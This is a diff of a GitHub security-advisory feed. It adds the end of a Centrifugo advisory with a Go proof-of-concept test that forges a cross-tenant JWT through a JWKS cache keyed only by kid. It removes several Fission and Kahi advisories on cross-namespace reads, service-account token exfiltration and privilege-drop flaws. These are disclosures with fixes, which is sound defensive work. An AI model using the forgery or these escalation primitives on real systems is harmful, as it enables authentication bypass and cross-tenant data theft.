+func getRSAIssuerConnToken(t *testing.T, user string, issuer string, rsaPrivateKey *rsa.PrivateKey, kid string) string {
+    t.Helper()
+    signer, err := jwt.NewSignerRS(jwt.RS256, rsaPrivateKey)
+    require.NoError(t, err)
+    builder := jwt.NewBuilder(signer, jwt.WithKeyID(kid))
+    claims := &amp;ConnectTokenClaims{
+        Base64Info: "e30=",
+        RegisteredClaims: jwt.RegisteredClaims{
+            Subject:   user,
+            Issuer:    issuer,
+            ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
+        },
+    }
+    token, err := builder.Build(claims)
+    require.NoError(t, err)
+    return token.String()
+}
+
+func TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC(t *testing.T) {
+    const kid = "shared-kid"
+
+    tenantAPrivateKey, tenantAPublicKey := generateTestRSAKeys(t)
+    tenantBPrivateKey, tenantBPublicKey := generateTestRSAKeys(t)
+
+    var tenantARequests int32
+    var tenantBRequests int32
+
+    ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        switch r.URL.Path {
+        case "/tenant-a/jwks.json":
+            atomic.AddInt32(&amp;tenantARequests, 1)
+            writeRSAJWKS(t, w, tenantAPublicKey, kid)
+        case "/tenant-b/jwks.json":
+            atomic.AddInt32(&amp;tenantBRequests, 1)
+            writeRSAJWKS(t, w, tenantBPublicKey, kid)
+        default:
+            http.NotFound(w, r)
+        }
+    }))
+    defer ts.Close()
+
+    cfg := config.DefaultConfig()
+    cfgContainer, err := config.NewContainer(cfg)
+    require.NoError(t, err)
+
+    newVerifier := func() *VerifierJWT {
+        verifier, err := NewTokenVerifierJWT(VerifierConfig{
+            JWKSPublicEndpoint: ts.URL + "/{{tenant}}/jwks.json",
+            IssuerRegex:        `^(?P&lt;tenant&gt;tenant-a|tenant-b)$`,
+        }, cfgContainer)
+        require.NoError(t, err)
+        return verifier
+    }
+
+    legitimateTenantAToken := getRSAIssuerConnToken(t, "tenant-a-user", "tenant-a", tenantAPrivateKey, kid)
+    legitimateTenantBToken := getRSAIssuerConnToken(t, "tenant-b-user", "tenant-b", tenantBPrivateKey, kid)
+    forgedTenantBToken := getRSAIssuerConnToken(t, "victim", "tenant-b", tenantAPrivateKey, kid)
+
+    ct, err := newVerifier().VerifyConnectToken(legitimateTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-b-user", ct.UserID)
+
+    _, err = newVerifier().VerifyConnectToken(forgedTenantBToken, false)
+    require.Error(t, err)
+
+    verifier := newVerifier()
+    ct, err = verifier.VerifyConnectToken(legitimateTenantAToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "tenant-a-user", ct.UserID)
+
+    tenantBRequestsBeforeForge := atomic.LoadInt32(&amp;tenantBRequests)
+    ct, err = verifier.VerifyConnectToken(forgedTenantBToken, false)
+    require.NoError(t, err)
+    require.Equal(t, "victim", ct.UserID)
+    require.Equal(t, tenantBRequestsBeforeForge, atomic.LoadInt32(&amp;tenantBRequests))
+}
+</code></pre>
+<p>Run the focused test with the project-supported Go toolchain:</p>
+<pre><code class="language-bash">go test ./internal/jwtverify -run TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC -count=1 -v
+</code></pre>
+<p>Observed vulnerable output in my local test environment using Go 1.26.3:</p>
+<pre><code class="language-text">=== RUN   TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+{"level":"info","endpoint":"http://127.0.0.1:32811/%7B%7Btenant%7D%7D/jwks.json","time":"2026-05-21T23:49:28+07:00","message":"JWKS manager created"}
+--- PASS: TestJWKSCacheKeyIsNotScopedToTemplatedEndpointPoC (0.07s)
+PASS
+ok  	github.com/centrifugal/centrifugo/v6/internal/jwtverify	0.088s
+</code></pre>
+<p>The passing test demonstrates the vulnerable behavior because it asserts these controls:</p>
+<ol>
+<li>A legitimate tenant-B token signed by tenant B succeeds with a fresh verifier.</li>
+<li>A forged tenant-B token signed by tenant A fails with a fresh verifier.</li>
+<li>A legitimate tenant-A token succeeds and primes the JWKS cache with tenant A's <code>shared-kid</code> key.</li>
+<li>The forged tenant-B token signed by tenant A then succeeds with user ID <code>victim</code>.</li>
+<li>The tenant-B JWKS request counter does not increase during forged verification, proving the forged token was accepted from the cross-tenant cache hit rather than from tenant B's JWKS endpoint.</li>
+</ol>
+<p>Expected behavior after a fix: the forged tenant-B token should remain rejected after tenant A primes the cache, or the verifier should fetch/consult tenant B's independent JWKS cache namespace before verification.</p>
+<h4 id="impact">Impact</h4>
+<p>This is a cross-issuer / cross-tenant JWT authentication bypass in dynamic JWKS deployments.</p>
+<p>Impacted deployments are those that use dynamic JWKS endpoint templates to select different JWKS URLs for different allowed issuers or audiences, for example multi-tenant deployments using <code>{{tenant}}</code> values extracted from <code>iss</code> or <code>aud</code>.</p>
+<p>An attacker who can obtain or mint a valid token for one allowed issuer/tenant can authenticate as another allowed issuer/tenant if both JWKS documents use the same <code>kid</code> value and the attacker's issuer key is cached first. <code>kid</code> values are not globally unique by specification and are often operational labels such as <code>current</code>, <code>default</code>, or rotation identifiers, so the verifier should not rely on <code>kid</code> uniqueness across different JWKS trust domains.</p>
+<p>Potential consequences include:</p>
+<ul>
+<li>Authentication as a user in another issuer/tenant namespace.</li>
+<li>Unauthorized connection-token acceptance.</li>
+<li>Unauthorized subscription-token acceptance where separate subscription JWTs are configured.</li>
+<li>Cross-tenant confidentiality and integrity impact when issuer-derived JWKS endpoints are used as separate trust domains.</li>
+</ul>
+<h4 id="suggested-remediation">Suggested remediation</h4>
+<p>Scope JWKS cache entries and <code>singleflight</code> keys to the resolved JWKS trust domain, not only to the JWT <code>kid</code>.</p>
+<p>For dynamic endpoints, compute the endpoint namespace before cache lookup and use a composite cache key such as:</p>
+<pre><code class="language-text">resolved_jwks_url + "\x00" + kid
+</code></pre>
+<p>or an equivalent canonical trust-domain identifier plus <code>kid</code>.</p>
+<p>The same composite namespace should be used for:</p>
+<ul>
+<li>TTL cache lookup.</li>
+<li>TTL cache storage.</li>
+<li><code>singleflight.Group.Do</code> keys.</li>
+</ul>
+<p>A regression test should prime tenant A's cache and then verify that a forged tenant-B token signed by tenant A remains rejected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/centrifugal/centrifugo/security/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+<li><a href="https://github.com/advisories/GHSA-g6vg-wj8f-48cj">https://github.com/advisories/GHSA-g6vg-wj8f-48cj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g6vg-wj8f-48cj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T20:28:52.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/sipeed/picoclaw] picoclaw is vulnerable to OS command injection via the ExecTool component]]></title>
         <id>https://github.com/advisories/GHSA-cv2p-68f4-f4pw</id>
@@ -716,211 +1921,5 @@ and stale Function objects from upgrade-before-restart windows.</li>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-30T18:17:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/fission/fission] Fission: Cross-namespace Package read via unvalidated PackageRef in Function admission webhook]]></title>
-        <id>https://github.com/advisories/GHSA-3r8v-2xmj-5c39</id>
-        <link href="https://github.com/advisories/GHSA-3r8v-2xmj-5c39"/>
-        <updated>2026-06-30T18:16:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A Fission Function spec carries three reference types — Secret, ConfigMap, and Package. The first two were namespace-validated by the admission webhook; <code>PackageRef.Namespace</code> was not.</p>
-<h3 id="details">Details</h3>
-<p>A tenant with <code>functions.fission.io/create</code> in their own namespace could set <code>spec.package.packageref.namespace</code> to any other namespace. When the function is invoked, the fetcher sidecar reads the victim Package using the
-<code>fission-fetcher</code> service account's namespace-wide <code>get packages</code> permission and writes its contents to <code>/userfunc/deployarchive</code> inside the attacker's pool pod, exposing the victim's source code and any embedded credentials.</p>
-<p>The <code>fission-fetcher</code> SA holds <code>get packages</code> in every configured function namespace (granted by <code>charts/fission-all/templates/_function-access-role.tpl</code>), so the namespace check was the only barrier between the attacker and any
-in-cluster Fission Package.</p>
-<h3 id="impact">Impact</h3>
-<p>A function author in one namespace could read the deployment archive — and therefore the source code and embedded secrets — of any Package in any other namespace.</p>
-<h3 id="fix">Fix</h3>
-<p>Fixed in <a href="https://github.com/fission/fission/pull/3389">#3389</a> and released in <a href="https://github.com/fission/fission/releases/tag/v1.24.0">v1.24.0</a>.</p>
-<p>The admission webhook (<code>pkg/webhook/function.go::Validate</code>) rejects <code>Function.spec.package.packageref.namespace != metadata.namespace</code>. An empty namespace remains accepted (controllers default it to the function's namespace). This
-shipped together with the EnvironmentRef cross-namespace check (GHSA-cvw6-gfvv-953q).</p>
-<h3 id="behavioural-change">Behavioural change</h3>
-<p>Functions that explicitly set <code>spec.package.packageref.namespace</code> to a different namespace are now rejected at admission.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fission/fission/security/advisories/GHSA-3r8v-2xmj-5c39">https://github.com/fission/fission/security/advisories/GHSA-3r8v-2xmj-5c39</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49823">https://nvd.nist.gov/vuln/detail/CVE-2026-49823</a></li>
-<li><a href="https://github.com/fission/fission/pull/3389">https://github.com/fission/fission/pull/3389</a></li>
-<li><a href="https://github.com/fission/fission/commit/80e7ba55228e1ef426f51353e25d2682ec61de34">https://github.com/fission/fission/commit/80e7ba55228e1ef426f51353e25d2682ec61de34</a></li>
-<li><a href="https://github.com/fission/fission/releases/tag/v1.24.0">https://github.com/fission/fission/releases/tag/v1.24.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-3r8v-2xmj-5c39">https://github.com/advisories/GHSA-3r8v-2xmj-5c39</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3r8v-2xmj-5c39</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-30T18:16:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/fission/fission] Fission: Cross-namespace event leakage via KubernetesWatchTrigger allows persistent tenant surveillance]]></title>
-        <id>https://github.com/advisories/GHSA-gc3j-79f2-7vvw</id>
-        <link href="https://github.com/advisories/GHSA-gc3j-79f2-7vvw"/>
-        <updated>2026-06-30T18:16:04.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A low-privilege developer who could create a <code>KubernetesWatchTrigger</code> (KWT) in their own namespace was able to establish a persistent surveillance channel over any other namespace.</p>
-<h3 id="details">Details</h3>
-<p>Two independent flaws compounded:</p>
-<ol>
-<li><code>pkg/kubewatcher/kubewatcher.go::createKubernetesWatch</code> used <code>w.Spec.Namespace</code> (user-controlled) directly as the Watch target without checking it against <code>w.Namespace</code> (the KWT's own namespace). <code>kubewatcher</code> established the Watch
-using its cluster-scoped service account and serialized every Pod/Service/Job change event as full JSON over HTTP POST to the attacker's function.</li>
-<li>The validating webhook (<code>pkg/webhook/kuberneteswatchtrigger.go</code>) registered <code>verbs=create</code> only, so <code>update</code>/<code>patch</code> requests bypassed validation entirely.</li>
-</ol>
-<p>A separate leak: an empty <code>spec.namespace</code> resolved to <strong>all namespaces</strong> via the controller's default, letting an attacker omit the field to surveil the entire cluster.</p>
-<h3 id="impact">Impact</h3>
-<p>A tenant with <code>kuberneteswatchtriggers.fission.io/create</code> could continuously receive full event payloads for Pods, Services, and Jobs in any namespace — a persistent cross-tenant surveillance channel requiring no additional privileges.</p>
-<h3 id="fix">Fix</h3>
-<p>Fixed in <a href="https://github.com/fission/fission/pull/3379">#3379</a> and released in <a href="https://github.com/fission/fission/releases/tag/v1.24.0">v1.24.0</a>.</p>
-<ul>
-<li>The validating webhook marker is extended to <code>verbs=create;update</code>.</li>
-<li><code>Validate</code> rejects <code>KubernetesWatchTrigger.spec.namespace != metadata.namespace</code>.</li>
-<li>A controller guard in <code>createKubernetesWatch</code> rejects cross-namespace targets that bypass admission and coerces an empty <code>Spec.Namespace</code> to the trigger's own namespace.</li>
-</ul>
-<h3 id="behavioural-change">Behavioural change</h3>
-<p>KubernetesWatchTriggers with an unset <code>spec.namespace</code> now watch only their own namespace instead of all namespaces. Anyone relying on the previous all-namespaces behaviour must create a separate KWT per namespace.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fission/fission/security/advisories/GHSA-gc3j-79f2-7vvw">https://github.com/fission/fission/security/advisories/GHSA-gc3j-79f2-7vvw</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49822">https://nvd.nist.gov/vuln/detail/CVE-2026-49822</a></li>
-<li><a href="https://github.com/fission/fission/pull/3379">https://github.com/fission/fission/pull/3379</a></li>
-<li><a href="https://github.com/fission/fission/commit/e2b92663499f4dc3a1e2d38178f39c3c65e0134a">https://github.com/fission/fission/commit/e2b92663499f4dc3a1e2d38178f39c3c65e0134a</a></li>
-<li><a href="https://github.com/fission/fission/releases/tag/v1.24.0">https://github.com/fission/fission/releases/tag/v1.24.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-gc3j-79f2-7vvw">https://github.com/advisories/GHSA-gc3j-79f2-7vvw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gc3j-79f2-7vvw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-30T18:16:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/fission/fission] Fission: Cross-namespace Environment reference in Package allows build-time command execution and SA token exfiltration]]></title>
-        <id>https://github.com/advisories/GHSA-vjhc-cf4p-72q4</id>
-        <link href="https://github.com/advisories/GHSA-vjhc-cf4p-72q4"/>
-        <updated>2026-06-30T18:15:28.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Fission's <code>buildermgr</code> controller processed <code>Package</code> CRDs without verifying that <code>Package.spec.environment.namespace</code> matched <code>Package.metadata.namespace</code>.</p>
-<h3 id="details">Details</h3>
-<p>An attacker with <code>packages.fission.io/create</code> in their own namespace could set <code>spec.environment.namespace</code> to any other tenant's namespace. The controller then used its high-privilege service account to fetch the Environment
-cross-namespace and dispatch the build command into the <strong>victim namespace's</strong> builder pod.</p>
-<p>The build command's stdout is written verbatim into <code>Package.status.buildlog</code>. By running malicious code through an npm <code>preinstall</code> lifecycle hook (or any equivalent build step), the attacker could read the victim namespace's
-<code>fission-builder</code> Bearer token from inside that builder pod and surface it through the build log — then use the leaked token to read every Secret and ConfigMap in the victim namespace.</p>
-<h3 id="impact">Impact</h3>
-<p>Cross-tenant compromise: a package author in one namespace could execute code inside another tenant's builder pod and exfiltrate that namespace's <code>fission-builder</code> service-account token, giving namespace-wide secret and configmap read in
- the victim namespace.</p>
-<h3 id="fix">Fix</h3>
-<p>Fixed in <a href="https://github.com/fission/fission/pull/3379">#3379</a> and released in <a href="https://github.com/fission/fission/releases/tag/v1.24.0">v1.24.0</a>. Two checks in series:</p>
-<ul>
-<li><strong>Admission webhook</strong> (<code>pkg/webhook/package.go::Validate</code>) rejects <code>Package.spec.environment.namespace != Package.metadata.namespace</code>. An empty namespace is still accepted; the controllers default it to the package's own namespace.</li>
-<li><strong>Controller belt-and-braces:</strong> the same check is repeated in <code>pkg/buildermgr/pkgwatcher.go::build</code> and <code>pkg/buildermgr/common.go::buildPackage</code> before the cross-namespace <code>Environments(...).Get</code> call, so a stale Package CR or a
-webhook-bypass cluster (<code>failurePolicy=Ignore</code>) cannot exploit the primitive either.</li>
-</ul>
-<h3 id="behavioural-change">Behavioural change</h3>
-<p>Packages that explicitly set <code>spec.environment.namespace</code> to a different namespace are now rejected at admission. Empty-string remains accepted (resolves to the package's own namespace, the same as the prior implicit behaviour).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fission/fission/security/advisories/GHSA-vjhc-cf4p-72q4">https://github.com/fission/fission/security/advisories/GHSA-vjhc-cf4p-72q4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49821">https://nvd.nist.gov/vuln/detail/CVE-2026-49821</a></li>
-<li><a href="https://github.com/fission/fission/pull/3379">https://github.com/fission/fission/pull/3379</a></li>
-<li><a href="https://github.com/fission/fission/commit/e2b92663499f4dc3a1e2d38178f39c3c65e0134a">https://github.com/fission/fission/commit/e2b92663499f4dc3a1e2d38178f39c3c65e0134a</a></li>
-<li><a href="https://github.com/fission/fission/releases/tag/v1.24.0">https://github.com/fission/fission/releases/tag/v1.24.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-vjhc-cf4p-72q4">https://github.com/advisories/GHSA-vjhc-cf4p-72q4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vjhc-cf4p-72q4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-30T18:15:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/fission/fission] Fission: MessageQueueTrigger scaler manager materializes Secret values into Deployment envvars and accepts arbitrary user PodSpec]]></title>
-        <id>https://github.com/advisories/GHSA-7m8x-qg2j-4m3v</id>
-        <link href="https://github.com/advisories/GHSA-7m8x-qg2j-4m3v"/>
-        <updated>2026-06-30T18:12:49.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Fission MessageQueueTrigger (MQT) scaler controller exposed two privilege-escalation primitives to any subject able to create MQTs in a namespace.</p>
-<h3 id="details">Details</h3>
-<p><strong>1. Secret materialization.</strong> <code>getEnvVarlist</code> in <code>pkg/mqtrigger/scalermanager.go</code> read the Secret named in <code>Spec.Secret</code> using the controller's cluster-wide <code>secrets/get</code> RBAC and emitted each key as a literal <code>EnvVar.Value</code>, copying
-the plaintext secret content into the connector Deployment's pod template. A subject holding <code>messagequeuetriggers/create</code> but <strong>not</strong> <code>secrets/get</code> could exfiltrate any Secret in the namespace by pointing an MQT at it.</p>
-<p><strong>2. PodSpec injection.</strong> <code>Spec.PodSpec</code> was merged into the controller-built connector PodSpec via <code>util.MergePodSpec</code> with no allowlist on which fields could come from the user. An MQT could substitute <code>Containers[].Image</code> (run any
-image), override <code>Command</code>/<code>Args</code>, inject <code>Env</code>, add <code>VolumeMounts</code> + <code>Volumes</code>, override <code>ServiceAccountName</code>, and set <code>HostNetwork</code>/<code>HostPID</code>/<code>HostIPC</code> — turning <code>messagequeuetriggers/create</code> into effective <code>deployments/create</code> with an
- arbitrary image and service account.</p>
-<h3 id="impact">Impact</h3>
-<p>A tenant with only <code>messagequeuetriggers.fission.io/create</code> in a namespace could read any Secret in that namespace and run an arbitrary container image under an arbitrary service account, escalating well beyond their intended RBAC.</p>
-<h3 id="fix">Fix</h3>
-<p>Fixed in <a href="https://github.com/fission/fission/pull/3367">#3367</a> and released in <a href="https://github.com/fission/fission/releases/tag/v1.24.0">v1.24.0</a>.</p>
-<ul>
-<li><code>getEnvVarlist</code> now emits <code>EnvVar.ValueFrom.SecretKeyRef</code> so the connector pod resolves values at start time under its own service account. The secret values are never written into the Deployment object and never logged.</li>
-<li>A new allowlist, <code>MergeAllowedPodSpecFields</code> (<code>pkg/executor/util/merge_allowlist.go</code>), accepts only <code>NodeSelector</code>, <code>Tolerations</code>, <code>Affinity</code>, <code>RuntimeClassName</code>, and per-container <code>Resources</code>. All other user-supplied fields are
-dropped at the controller layer, and the validating webhook rejects every populated non-allowlisted field with a clear error. The webhook and the merge helper share a single canonical <code>DisallowedPodSpecFields</code> enumeration so they cannot
-drift.</li>
-</ul>
-<h3 id="behavioural-change">Behavioural change</h3>
-<p>MQT authors that previously overrode the connector image, command, args, env, volumes, service account, or host namespaces via <code>Spec.PodSpec</code> will see those fields rejected at admission (or silently dropped if the webhook is disabled).
-Allowlisted fields flow through unchanged.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fission/fission/security/advisories/GHSA-7m8x-qg2j-4m3v">https://github.com/fission/fission/security/advisories/GHSA-7m8x-qg2j-4m3v</a></li>
-<li><a href="https://github.com/fission/fission/pull/3367">https://github.com/fission/fission/pull/3367</a></li>
-<li><a href="https://github.com/fission/fission/commit/94bf5792396989fdd71961e8701833c8110da889">https://github.com/fission/fission/commit/94bf5792396989fdd71961e8701833c8110da889</a></li>
-<li><a href="https://github.com/fission/fission/releases/tag/v1.24.0">https://github.com/fission/fission/releases/tag/v1.24.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-7m8x-qg2j-4m3v">https://github.com/advisories/GHSA-7m8x-qg2j-4m3v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7m8x-qg2j-4m3v</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-30T18:12:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kahiteam/kahi] Kahi has privilege-drop and socket/log permission issues]]></title>
-        <id>https://github.com/advisories/GHSA-55f6-4pr5-c7m5</id>
-        <link href="https://github.com/advisories/GHSA-55f6-4pr5-c7m5"/>
-        <updated>2026-06-30T18:07:46.000Z</updated>
-        <content type="html"><![CDATA[<p>Kahi releases up to and including v0.1.0-alpha.8 contain three privilege/permission issues, all fixed in v0.1.0-alpha.9. They were identified in a full-codebase security review on 2026-05-26.</p>
-<h2 id="affected-versions">Affected versions</h2>
-<p>All releases &lt;= v0.1.0-alpha.8.</p>
-<h2 id="patched-version">Patched version</h2>
-<p>v0.1.0-alpha.9.</p>
-<h2 id="details">Details</h2>
-<h3 id="1-per-process-privilege-drop-not-applied-high">1. Per-process privilege drop not applied (High)</h3>
-<p>A process configured with <code>user = "uid:gid"</code> had its credential resolved but never attached to the spawned child, so the process ran with the supervisor's inherited privileges (root, when the supervisor runs as root) instead of the configured lower-privilege user. The intended privilege isolation did not occur, and no error was raised.</p>
-<h3 id="2-privilege-drop-did-not-reset-supplementary-groups-medium">2. Privilege drop did not reset supplementary groups (Medium)</h3>
-<p>When the daemon dropped privileges it set the primary gid and uid but never called setgroups(2), so the launching user's supplementary groups (for example <code>docker</code>, which is root-equivalent) remained active after the drop and were inherited by child processes.</p>
-<h3 id="3-fastcgi-unix-socket-world-accessible-by-default-medium">3. FastCGI unix socket world-accessible by default (Medium)</h3>
-<p>A FastCGI unix-domain socket was chmod-ed only when <code>socket_mode</code> was explicitly configured. With <code>socket_mode</code> unset the socket kept the umask-dependent default (commonly world-accessible), allowing any local user to connect to it.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Upgrade to v0.1.0-alpha.9. Privilege handling is now fail-closed: the configured credential is applied or the process refuses to start, supplementary groups are reset via setgroups before setgid/setuid, and FastCGI unix sockets default to 0700.</p>
-<h2 id="workarounds-for--v010-alpha8">Workarounds (for &lt;= v0.1.0-alpha.8)</h2>
-<ul>
-<li>Do not rely on per-process <code>user</code>; run the supervisor directly as the intended unprivileged user.</li>
-<li>Set an explicit restrictive <code>socket_mode</code> on FastCGI programs.</li>
-<li>Avoid running the supervisor as root where possible.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kahiteam/kahi/security/advisories/GHSA-55f6-4pr5-c7m5">https://github.com/kahiteam/kahi/security/advisories/GHSA-55f6-4pr5-c7m5</a></li>
-<li><a href="https://github.com/advisories/GHSA-55f6-4pr5-c7m5">https://github.com/advisories/GHSA-55f6-4pr5-c7m5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-55f6-4pr5-c7m5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-30T18:07:44.000Z</published>
     </entry>
 </feed>
